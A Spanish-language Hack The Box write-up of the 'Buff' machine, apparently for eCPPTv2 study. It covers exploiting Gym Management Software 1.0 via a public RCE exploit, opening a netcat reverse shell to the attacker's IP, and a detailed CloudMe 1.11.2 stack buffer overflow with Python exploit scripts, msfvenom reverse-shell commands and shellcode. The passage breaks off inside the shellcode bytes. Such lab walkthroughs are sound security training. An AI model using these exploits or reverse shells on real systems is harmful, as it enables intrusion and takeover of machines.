---
title: HTB Buff
date: 2024-04-15 14:10:00 +0800
author: pablo
categories: [HTB, Windows]
tags:
  [
    Gym Management System Exploitation (RCE),
    CloudMe Exploitation,
    Buffer Overflow,
  ]
image:
  path: /assets/img/Buff/PortadaBuff.png
---

## Descripción

Buff es una muy máquina para prepararse para el eCPPTv2 en cuanto al tema del Buffer Overflow. En esta máquina se tendrá que identificar un software web que se ejecuta en el sitio, y explotarlo utilizando un exploit público para obtener la ejecución a través de una webshell. Para PrivEsc, encontraré otro servicio que se puede explotar a través de un Buffer Overflow.
En este post se tratará de explicar lo mejor posible y detalladamente como explotar un Buffer Overflow. Si es la primera vez que tratas la vulnerabilidad de Buffer Overflow demasiada información puede parecer abrumadora, pero una vez que entiendes la metodología a seguir la explotación se vuelve muy monótona.

---

## Reconocimiento

Se comprueba que la máquina está activa y se determina su sistema operativo a través del `TTL`

```bash
❯ ping -c 1 10.10.10.198
PING 10.10.10.198 (10.10.10.198) 56(84) bytes of data.
64 bytes from 10.10.10.198: icmp_seq=1 ttl=127 time=108 ms

--- 10.10.10.198 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 107.505/107.505/107.505/0.000 ms
```

El sistema operativo es un `Windows`

### Nmap

Se va a realizar un escaneo de todos los puertos abiertos en el protocolo TCP a través de `nmap`. Comando: `sudo nmap -p- --open -sS -T4 -vvv -n -Pn <IP> -oG allPorts`

```bash
❯ sudo nmap -p- --open -sS -n -Pn -vvv -T5 10.10.10.198
[sudo] password for ppacheco:
Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-01 10:01 CDT
Initiating SYN Stealth Scan at 10:01
Scanning 10.10.10.198 [65535 ports]
Discovered open port 8080/tcp on 10.10.10.198
SYN Stealth Scan Timing: About 10.94% done; ETC: 10:06 (0:04:12 remaining)
SYN Stealth Scan Timing: About 26.54% done; ETC: 10:05 (0:02:49 remaining)
SYN Stealth Scan Timing: About 42.09% done; ETC: 10:05 (0:02:05 remaining)
Discovered open port 7680/tcp on 10.10.10.198
SYN Stealth Scan Timing: About 72.83% done; ETC: 10:04 (0:00:45 remaining)
Completed SYN Stealth Scan at 10:04, 153.16s elapsed (65535 total ports)
Nmap scan report for 10.10.10.198
Host is up, received user-set (0.11s latency).
Scanned at 2024-04-01 10:01:57 CDT for 153s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
7680/tcp open  pando-pub  syn-ack ttl 127
8080/tcp open  http-proxy syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 153.40 seconds
           Raw packets sent: 131177 (5.772MB) | Rcvd: 110 (4.840KB)
```

Puertos abiertos son:

```bash
7680, 8080
```

Se procede a realizar un análisis de detección de servicios y la identificación de versiones utilizando los puertos abiertos encontrados.

Comando: `nmap -sCV -p<Ports Open> <IP> -oN targeted`

```bash
❯ nmap -p7680,8080 -sCV -Pn 10.10.10.198
Starting Nmap 7.94 ( https://nmap.org ) at 2024-04-01 10:06 CDT
Nmap scan report for 10.10.10.198
Host is up (0.11s latency).

PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-title: mrb3n's Bro Hut
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.93 seconds

```

### Puerto 8080 `http`

Visitando el sitio web se tiene:

![Untitled](/assets/img/Buff/Pasted image 20240401101023.png)

Con `whatweb` se va a listar el gestor de contenido y las tecnologías que está corriendo el servidor web, corresponde a un servicio de `Apache` y está interpretando `PHP`

```bash
❯ whatweb http://10.10.10.198:8080
http://10.10.10.198:8080 [200 OK] Apache[2.4.43], Bootstrap, Cookies[sec_session_id], Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6], HttpOnly[sec_session_id], IP[10.10.10.198], JQuery[1.11.0,1.9.1], OpenSSL[1.1.1g], PHP[7.4.6], PasswordField[password], Script[text/JavaScript,text/javascript], Shopify, Title[mrb3n's Bro Hut], Vimeo, X-Powered-By[PHP/7.4.6], X-UA-Compatible[IE=edge]
```

A través de `gobuster` se va a realizar enumeración de directorios e incluyendo el parametro `-x php` para que nos liste archivos `PHP`

Obteniendo:

```bash
❯  gobuster dir -u http://10.10.10.198:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php -t 40
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.198:8080
[+] Method:                  GET
[+] Threads:                 40
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 341] [--> http://10.10.10.198:8080/img/]
/about.php            (Status: 200) [Size: 5337]
/contact.php          (Status: 200) [Size: 4169]
/index.php            (Status: 200) [Size: 4969]
/home.php             (Status: 200) [Size: 143]
/profile              (Status: 301) [Size: 345] [--> http://10.10.10.198:8080/profile/]
/register.php         (Status: 200) [Size: 137]
/feedback.php         (Status: 200) [Size: 4252]
/Home.php             (Status: 200) [Size: 143]
/upload               (Status: 301) [Size: 344] [--> http://10.10.10.198:8080/upload/]
/upload.php           (Status: 200) [Size: 107]
/Contact.php          (Status: 200) [Size: 4169]
/About.php            (Status: 200) [Size: 5337]
/edit.php             (Status: 200) [Size: 4282]
/license              (Status: 200) [Size: 18025]
/Index.php            (Status: 200) [Size: 4969]
/up.php               (Status: 200) [Size: 209]
/packages.php         (Status: 200) [Size: 7791]
/examples             (Status: 503) [Size: 1058]
/include              (Status: 301) [Size: 345] [--> http://10.10.10.198:8080/include/]
/licenses             (Status: 403) [Size: 1203]
/facilities.php       (Status: 200) [Size: 5961]
/Register.php         (Status: 200) [Size: 137]
/Profile              (Status: 301) [Size: 345] [--> http://10.10.10.198:8080/Profile/]
/LICENSE              (Status: 200) [Size: 18025]
/Feedback.php         (Status: 200) [Size: 4252]
/att                  (Status: 301) [Size: 341] [--> http://10.10.10.198:8080/att/]
/att.php              (Status: 200) [Size: 816]
/%20                  (Status: 403) [Size: 1044]
/IMG                  (Status: 301) [Size: 341] [--> http://10.10.10.198:8080/IMG/]
/INDEX.php            (Status: 200) [Size: 4969]
/License              (Status: 200) [Size: 18025]
/ex                   (Status: 301) [Size: 340] [--> http://10.10.10.198:8080/ex/]
/*checkout*.php       (Status: 403) [Size: 1044]
/*checkout*           (Status: 403) [Size: 1044]
Progress: 15404 / 175330 (8.79%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 15404 / 175330 (8.79%)
===============================================================
Finished
===============================================================
```

Inspeccionado la página web en la sección de `Contact` se lista que se está utilizando `Gym Management Software 1.0 `

![Untitled](/assets/img/Buff/Pasted image 20240401101846.png)

## Análisis de vulnerabilidades

A través de `searchsploit` se busca vulnerabilidades correspondientes a `Gym Management`

Obteniendo:

![Untitled](/assets/img/Buff/Pasted image 20240401102023.png)

Se lista un exploit con posible ejecución remota de comandos

A través de `searchsploit -m 48506.py ` se procede a traer el exploit a la máquina atacante

El exploit esta realizado en `python2` para ejecutarlo debemos proporcionar la direccion web donde esta corriendo el servicio del `Gym Management`

![Untitled](/assets/img/Buff/Pasted image 20240401102728.png)

El objetivo del exploit es lograr la ejecución remota de comandos (RCE) en el servidor web, aprovechando una vulnerabilidad que permite cargar un archivo PHP maliciosamente diseñado y eludir los filtros de carga de imágenes.

Se procede a ejecutar el exploit:

```bash
python2 48506.py http://10.10.10.198:8080/ 2>/dev/null
```

Obteniendo:

![Untitled](/assets/img/Buff/Pasted image 20240401103111.png)

Se gana acceso a la máquina víctima

## Shell as shaun

Al examinar el código del exploit, se observa que el payload malicioso se está cargando en la ruta `upload` con el nombre `kamehameha.php`, y a través del parámetro `telepathy` se controlan los comandos que se ejecutarán.

![Untitled](/assets/img/Buff/Pasted image 20240401103430.png)

![Untitled](/assets/img/Buff/Pasted image 20240401103730.png)

Para trabajar más cómodamente se va a obtener una reverse Shell interactiva a través de `rlwrap`, para lo cual en nuestra máquina atacante a través de `impacket-smbserver` sé a levantado una carpeta compartida en la cual se encuentra el binario de `nc64.exe` disponible en [netcat 1.11 for Win32/Win64](https://eternallybored.org/misc/netcat/) en otra ventana estaremos en escucha a través de `nc`

En el servicio web ejecutar:

```bash
\\10.10.14.12\smbFolder\nc64.exe -e cmd 10.10.14.12 443
```

![Untitled](/assets/img/Buff/Pasted image 20240401104342.png)

Obteniendo:

![Untitled](/assets/img/Buff/Pasted image 20240401104425.png)

Se dispone de una consola interactiva como el usuario `shaun`

En el directorio `C:\Users\shaun\Desktop` se encuentra la flag `user.txt`

![Untitled](/assets/img/Buff/Pasted image 20240401110008.png)

Ejecutando `winPEAS` el cual está disponible en [PEASS-ng/winPEAS at master · carlospolop/PEASS-ng · GitHub](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) nos lista que en el puerto local `8888` se encuentra corriendo el serviciode `Cloudme`

![Untitled](/assets/img/Buff/Pasted image 20240401165957.png)

Al buscar desde la raíz por el nombre "CloudMe", se descubre que el archivo se encuentra en la ruta `C:\Users\shaun\Downloads\CloudMe_1112.exe`.

![Untitled](/assets/img/Buff/Pasted image 20240401170451.png)

Al utilizar `searchsploit` para buscar vulnerabilidades, se observa que la mayoría de los resultados indican una posible vulnerabilidad de desbordamiento de búfer (Buffer Overflow).

![Untitled](/assets/img/Buff/Pasted image 20240401170735.png)

## Buffer Overflow

Para probar el `BoF` como máquina de pruebas estaré ocupando un `Windows 7 x32bits` y como binario vulnerable se estará ocupando:

```txt
## Software Link:
https://www.cloudme.com/downloads/CloudMe_1112.exe
## Version:
CloudMe 1.11.2
```

### Teoría

- Una explotación de Buffer Overflow es una vulnerabilidad de seguridad que ocurre cuando un programa intenta escribir más datos en un buffer de memoria de los que este puede contener, lo que puede llevar a sobrescribir regiones de memoria adyacentes.
- Como se puede apreciar en la imagen, cuando se introducen una cantidad excesiva de datos (representados por "A" en la imagen), estos sobrescriben otras áreas de memoria del sistema, como el `ESP` y el `EIP`. Estas áreas son de gran importancia para la posterior explotación.

  ![Untitled](/assets/img/Buff/Pasted image 20240401173748.png)

- Nuestro propósito como atacantes es introducir código malicioso en estas secciones de la memoria para modificar otros datos cruciales del sistema, como la dirección de retorno de una función o la ubicación de memoria donde se guarda una variable. Esto posibilita al atacante tomar el control del flujo del programa.
- Registros de memoria y términos importantes:
  - EIP (Extended Instruction Pointer)
    - Es un registro que indica la dirección de memoria donde se encuentra la próxima instrucción que se ejecutará.
    - Durante un ataque de buffer overflow exitoso, el valor del registro EIP es modificado por un atacante para que apunte a una dirección controlada por él mismo. Esto permite al atacante ejecutar código malicioso en lugar del código original del programa, lo que potencialmente compromete la integridad y seguridad del sistema.
    - El control sobre el registro EIP es fundamental ya que otorga al atacante el poder de dirigir la ejecución del programa hacia su propio código, abriendo la puerta a una variedad de posibles daños y compromisos de seguridad.
  - ESP (Extended Stack Pointer)
    - Es un registro vital en el sistema, el cual gestiona la pila (stack) de un programa.
    - La pila es un área de memoria temporal fundamental que almacena valores y direcciones de retorno de las funciones conforme se invocan durante la ejecución del programa.
    - Además de mantener un seguimiento de la ejecución del programa, el ESP también ayuda en la administración de la memoria al permitir que el programa acceda a los datos almacenados en la pila de manera eficiente. En resumen, el ESP desempeña un papel crucial en la estructura y funcionamiento de la pila, lo que contribuye significativamente al control y flujo de ejecución del programa.
  - Shellcode:
    - Un shellcode es un fragmento de código a bajo nivel diseñado para ser ejecutado directamente por un intérprete de comandos o un programa vulnerable con el fin de iniciar una acción específica.

### Metodología

La metodología general a seguir para explotar el Buffer Overflow es la siguiente:

1. Causar una Denegación de Servicios
2. Fuzzing → verificar que se está sobrescribiendo registro `EIP`
3. Calcular el `offset`
4. Asignación de espacio para el Shellcode → dirección `ESP`
5. Encontrar Badchars
6. Crear shell code:
7. Encontrar el módulo adecuado
8. Aplicar NOPs (no operation code) o desplazamiento de la pila

### Configuración **Immunity Debugger**

> Immunity Debugger el Depurador Inmmunity es una poderosa nueva manera para escribir exploits, analizar malware, y realizar ingeniería inversa a archivos binarios.

En la máquina de `Windows 7` se va a instalar `Immnunity Debugger`

Descargando [https://raw.githubusercontent.com/corelan/mona/master/mona.py](https://raw.githubusercontent.com/corelan/mona/master/mona.py)

Creando un fichero `mona.py` y renombrando

![Untitled](/assets/img/Buff/Pasted image 20240401204619.png)|500

Moviendo el archivo a la ruta `C:\\Program Files\\Immunity Inc\\Immunity Debugger\\PyCommands`

Obteniendo![Untitled](/assets/img/Buff/Pasted image 20240401205118.png)|500Agregando binario para depurar

En el `File` > `Detach`

![Untitled](/assets/img/Buff/Pasted image 20240401204053.png)|500

Elegir el servicio `CloudMe`

![Untitled](/assets/img/Buff/Pasted image 20240401204128.png)|400

### Port Forwarding

En nuestra máquina de prueba `Windows 7` deberemos instalar la versión vulnerable de `CloudMe` que se proporciono anteriormente.

El servicio de `CloudMe` está corriendo localmente en el puerto `8888`

![Untitled](/assets/img/Buff/Pasted image 20240401200554.png)

para que sea visible desde nuestra máquina atacante realizaremos un `Port Forwarding` a través de `chisel`

En la máquina atacante levantamos el servidor de chisel y la maquina windows se conectara como cliente, utilizando:

```bash
## Maquina atacante - servidor chisel
./chisel server --reverse -p 1234

## Maquina Windows - client
chisel.exe client 192.168.1.18:1234 R:8888:127.0.0.1:8888
```

![Untitled](/assets/img/Buff/Pasted image 20240401201155.png)

Obteniendo:![Untitled](/assets/img/Buff/Pasted image 20240401201223.png)

En la máquina atacante se puede comprobar si el puerto `8888` ha sido ocupado:

![Untitled](/assets/img/Buff/Pasted image 20240401201320.png)

### Explotación en Local

1. Causar una Denegación de Servicios
   Adjuntar el binario en `Immunity Debugger` y ejecutarlo
   ![Untitled](/assets/img/Buff/Pasted image 20240401210001.png)|700

En esta primera etapa nuestro objetivo es hacer que el programa colapse, iremos aumentando el valor del `payload` hasta que el `Immunity Debuger` veamos el mensaje de `Pause`

```python
##!/usr/bin/python3

import socket
from struct import pack

payload = b"A"*1500
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 8888))
s.send(payload)
s.close
```

En este caso vemos que el `Immunity Debuger` se pausa en el valor de `1500`

![Untitled](/assets/img/Buff/Pasted image 20240401210257.png)

2. Fuzzing → verificar que se está sobrescribiendo registro `EIP`
   Mientras el programa está en pausa, verificamos si el registro `EIP` está siendo sobrescrito, ya que observamos el valor `41`, que corresponde al valor `A` en hexadecimal.

   ![Untitled](/assets/img/Buff/Pasted image 20240401210523.png)

3. Calcular el `offset`

   Ya sabemos que el programa colapsa con un valor de `1500`, por lo cual utilizando `metasploit` se va a crear un patrón de longitud 1500 caracteres

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1500
```

![Untitled](/assets/img/Buff/Pasted image 20240401211405.png)

Agregando esta cadena a nuestro payload

```python
##!/usr/bin/python3

import socket
from struct import pack

payload = b("a0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 8888))
s.send(payload)
s.close
```

Ejecutando el script y copiando el valor de EIP

![Untitled](/assets/img/Buff/Pasted image 20240401211816.png)|400

Utilizando para calcular el offset

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x<EIP>
```

![Untitled](/assets/img/Buff/Pasted image 20240401212121.png)

Introduciendo en el código, se ha modificado:

- `after_eip` → El valor del registro `EIP` antes de que comience a ser sobrescrito es de `1053`.
- `eip` → En el registro `EIP`, introduciremos cuatro caracteres `B` que deberíamos poder observar en el debugger.
- `before_eip` → La dirección de memoria que sigue al registro `EIP`, es decir el registro `ESP`, deberá contener cien caracteres `C`

```python
##!/usr/bin/python3

import socket
from struct import pack

after_eip = b"A"*1053
eip = b"C"*4
before_eip = b"C"*100

payload = after_eip + eip + before_eipt
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 8888))
s.send(payload)
s.close
```

Obteniendo:

Dando click derecho sobre el registro `ESP` para verificar su contenido:

![Untitled](/assets/img/Buff/Pasted image 20240401214331.png)

El valor del registro `EIP` debería mostrar exactamente las cuatro `C` que estamos introduciendo en el código. Por lo tanto, es necesario ajustar el valor del `offset` probando con un valor de `1052`.

![Untitled](/assets/img/Buff/Pasted image 20240401214507.png)

Ajustando `offset=1052`

```python
##!/usr/bin/python3

import socket
from struct import pack

after_eip = b"A"*1052
eip = b"B"*4
before_eip = b"C"*100

payload = after_eip + eip + before_eip
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 8888))
s.send(payload)
s.close
```

Obteniendo:

![Untitled](/assets/img/Buff/Pasted image 20240401214757.png)

Como se puede observar, estamos verificando que tenemos control sobre el registro `EIP`, ya que se están sobrescribiendo exactamente las cuatro `B`, cuyo valor en hexadecimal es `42`. Además, en el registro `ESP`, se están sobrescribiendo las cien `C`, las cuales ejecutamos con el programa.

4. Asignación de espacio para el Shellcode → dirección `ESP`

   Hemos completado la verificación: confirmamos que los cien caracteres de `C` que ejecutamos en el exploit están siendo almacenadas en el registro `ESP`. Más adelante, reemplazaremos estas instancias con el shellcode que crearemos utilizando `msfvenom`.

5. Encontrar Badchars

   Para encontrar los badchars lo haremos a través del módulo de `Mona` que previamente habíamos instalado en `Immunity Debugger`

- Definir el directorio de trabajo en mona

```bash
!mona config -set workingfolder C:\Users\pablo\Desktop\Buff
```

![Untitled](/assets/img/Buff/Pasted image 20240401215858.png)

- Crear bytearray

```bash
!mona bytearray
```

![Untitled](/assets/img/Buff/Pasted image 20240401215936.png)

- Creando bytearray pero sin el bit null (x00)

```bash
!mona bytearray -cpb "\x00"
```

![Untitled](/assets/img/Buff/Pasted image 20240401220018.png)

- En la máquina atacante copiar el archivo `bytearray.txt` del directorio de trabajo

  ![Untitled](/assets/img/Buff/Pasted image 20240401220531.png)

  Agregar al código del exploit

```python
##!/usr/bin/python3

import socket
from struct import pack

after_eip = b"A"*1052
eip = b"B"*4
before_eip = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = after_eip + eip + before_eip
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 8888))
s.send(payload)
s.close
```

Ejecutando:
![Untitled](/assets/img/Buff/Pasted image 20240401221247.png)
como se visualiza en le registro `ESP` se esta guardando las instrucciones correspondientes a la variable `before_eip` que es donde luego estara nuestro `shellcode`

- Utilizando mona para realizar de manera automática la comparación del valor `ESP` para identificar `badchars`
  A través de:

```python
!mona compare -a 0x<ESP> -f C:\Users\pablo\Desktop\<Directorio>\bytearray.bin
```

![Untitled](/assets/img/Buff/Pasted image 20240401221518.png)

Obteniendo:

![Untitled](/assets/img/Buff/Pasted image 20240401221618.png)

No se ha identificado ningún conjunto de `BadChars`, sin embargo, se recomienda excluir el byte `x00` del shellcode para evitar posibles problemas. En caso de identificar `badchars` seria necesario eliminarlos del código Python y repetir el proceso mencionado anteriormente.

6. Crear shell code:
   Utilizando `msfvenom`, generaremos el `shellcode`, que consiste en instrucciones de bajo nivel que contienen el código malicioso a ejecutar. En este caso, nos proporcionará una reverse shell a nuestra máquina atacante.

```bash
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.1.15 LPORT=443 -f c -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXICTFUNC=thread
```

- Obteniendo:

  ![Untitled](/assets/img/Buff/Pasted image 20240401225450.png)

  Agregando al código

7. Encontrar el módulo adecuado
   Buscar dirección de memoria para el `jmp ESP`

```bash
❯ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp ESP
00000000  FFE4              jmp esp
nasm >
```

En mona buscar el módulo correspondiente al binario a atacar debería estar con valores `FALSE`

```bash
!mona modules
```

![Untitled](/assets/img/Buff/Pasted image 20240401224618.png)

En este caso se escoge la `Qt5Gui.dll`

Encontrando la dirección de memoria

```bash
!mona find -s "\xFF\xE4" -m Qt5Gui.dll
```

![Untitled](/assets/img/Buff/Pasted image 20240401234014.png)

- Para que se pueda ejecutar el código la dirección de memoria encontrada debe listar `PAGE_EXECUTE`
- Escoger una dirección de memoria, por ejemplo `61FFBA23`

  ![Untitled](/assets/img/Buff/Pasted image 20240401234826.png)

- Colocar la dirección de memoria `EIP` escogida en formato `little-endian`

  En python

```python
eip = pack("<L", 0x<EIP>)
```

En el debugger vamos a realizar un `breakpoint` para verificar que el flujo del programa esté yendo en la dirección correcta:

- Buscando la dirección de memoria que se escogio

  ![Untitled](/assets/img/Buff/Pasted image 20240401225829.png)

- Realizando `breakpoint`, dar click derecho sobre la dirección de memoria y escoger:

  ![Untitled](/assets/img/Buff/Pasted image 20240401225947.png)|500

- Ejecutando el exploit

- En el debugger el flujo del programa se detendrá en el `breakpoint` configurado

  ![Untitled](/assets/img/Buff/Pasted image 20240401230242.png)

- Para que el flujo avance escoger la "flecha", fijarnos en los registros `ESP` y `EIP`

  ![Untitled](/assets/img/Buff/Pasted image 20240401230525.png)

  Al observar que el valor del registro `EIP` coincide con el del `ESP`, confirmamos que el flujo del programa está funcionando correctamente. Al realizar un `Follow in Dump` al registro `ESP`, podemos ver que el `shellcode` generado con `msfvenom` se está almacenando en él.

8. Aplicar NOPs (no operation code) o desplazamiento de la pila
   se debe aplicar `NOP's` que es una instrucción de ensamblador que no realiza ninguna operación útil, pero que se ejecuta para cumplir un propósito específico, como el relleno de espacio en un exploit o la sincronización de temporizaciones en programas de bucle.

```python
payload = before_eip + eip + b"\x90"*16 + shellcode #NOP's
```

Tendremos todo el código listo

```python
##!/usr/bin/python3

import socket
from struct import pack

##Registro EIP validos
##68E05735 valida
##64B4D6CD valida
##61FFBA23 valida
##620117A7 valida
after_eip = b"A"*1052
eip = pack("<L", 0x620117a7)

##msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=10.10.14.12 LPORT=443 -f c -e x86/shikata_ga_nai -b '\x00' EXICTFUNC=thread
shellcode = (b"\xdd\xc2\xbe\xdc\x1f\xf1\x2e\xd9\x74\x24\xf4\x5a\x29\xc9"
b"\xb1\x52\x31\x72\x17\x83\xea\xfc\x03\xae\x0c\x13\xdb\xb2"
b"\xdb\x51\x24\x4a\x1c\x36\xac\xaf\x2d\x76\xca\xa4\x1e\x46"
b"\x98\xe8\x92\x2d\xcc\x18\x20\x43\xd9\x2f\x81\xee\x3f\x1e"
b"\x12\x42\x03\x01\x90\x99\x50\xe1\xa9\x51\xa5\xe0\xee\x8c"
b"\x44\xb0\xa7\xdb\xfb\x24\xc3\x96\xc7\xcf\x9f\x37\x40\x2c"
b"\x57\x39\x61\xe3\xe3\x60\xa1\x02\x27\x19\xe8\x1c\x24\x24"
b"\xa2\x97\x9e\xd2\x35\x71\xef\x1b\x99\xbc\xdf\xe9\xe3\xf9"
b"\xd8\x11\x96\xf3\x1a\xaf\xa1\xc0\x61\x6b\x27\xd2\xc2\xf8"
b"\x9f\x3e\xf2\x2d\x79\xb5\xf8\x9a\x0d\x91\x1c\x1c\xc1\xaa"
b"\x19\x95\xe4\x7c\xa8\xed\xc2\x58\xf0\xb6\x6b\xf9\x5c\x18"
b"\x93\x19\x3f\xc5\x31\x52\xd2\x12\x48\x39\xbb\xd7\x61\xc1"
b"\x3b\x70\xf1\xb2\x09\xdf\xa9\x5c\x22\xa8\x77\x9b\x45\x83"
b"\xc0\x33\xb8\x2c\x31\x1a\x7f\x78\x61\x34\x56\x01\xea\xc4"
b"\x57\xd4\xbd\x94\xf7\x87\x7d\x44\xb8\x77\x16\x8e\x37\xa7"
b"\x06\xb1\x9d\xc0\xad\x48\x76\xe5\x3b\x5c\x8a\x91\x39\x60"
